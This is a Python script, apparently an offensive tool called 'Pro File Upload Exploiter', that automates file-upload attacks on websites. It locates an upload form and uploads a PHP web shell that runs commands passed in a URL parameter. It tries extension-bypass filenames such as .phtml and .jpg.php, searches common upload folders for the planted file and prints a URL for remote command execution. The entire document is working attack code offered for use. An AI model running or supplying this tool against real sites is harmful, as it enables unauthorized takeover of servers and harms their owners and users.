import requests, argparse, random, string, urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UPLOAD_PATHS = [
    "/uploads/", "/files/", "/upload/", "/assets/", "/images/", "/content/"
]

EXTENSIONS = [
    ".php", ".php5", ".phtml", ".jpg.php", ".gif.php", ".php.jpg"
]

PAYLOAD_TEMPLATE = "<?php echo 'UPLOAD_SUCCESS'; system($_GET['cmd']); ?>"

def generate_filename(extension):
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    return name + extension

def fetch_upload_field(url):
    try:
        r = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        file_input = form.find("input", {"type": "file"}) if form else None
        return form.get("action"), file_input.get("name") if file_input else None
    except:
        return None, None

def try_upload(session, upload_url, field, filename, content, mime):
    files = {field: (filename, content, mime)}
    try:
        r = session.post(upload_url, files=files, verify=False, timeout=10, allow_redirects=True)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)

def try_access(base_url, filename):
    for path in UPLOAD_PATHS:
        full_url = urljoin(base_url, path + filename)
        try:
            r = requests.get(full_url, timeout=10, verify=False)
            if "UPLOAD_SUCCESS" in r.text:
                print(f"[üí•] Upload succeeded and accessible at: {full_url}")
                print(f"[‚öôÔ∏è] Try RCE via: {full_url}?cmd=id")
                return True
        except: pass
    return False

def main(url):
    print(f"[üéØ] Target: {url}")
    form_action, field = fetch_upload_field(url)
    if not form_action or not field:
        print("[‚úñ] Upload form not found or invalid.")
        return
    upload_url = urljoin(url, form_action)

    session = requests.Session()
    for ext in EXTENSIONS:
        fname = generate_filename(ext)
        content = PAYLOAD_TEMPLATE.encode()
        status, result = try_upload(session, upload_url, field, fname, content, "application/octet-stream")
        if status and status in [200, 302]:
            print(f"[+] Attempted upload: {fname} (Status {status})")
            if try_access(url, fname):
                return
        else:
            print(f"[-] Upload failed for {fname}: {status}")

    print("[‚ùå] Exploit unsuccessful. Manual testing recommended.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="üì§ Pro File Upload Exploiter")
    parser.add_argument("url", help="Target upload page URL")
    args = parser.parse_args()
    main(args.url)
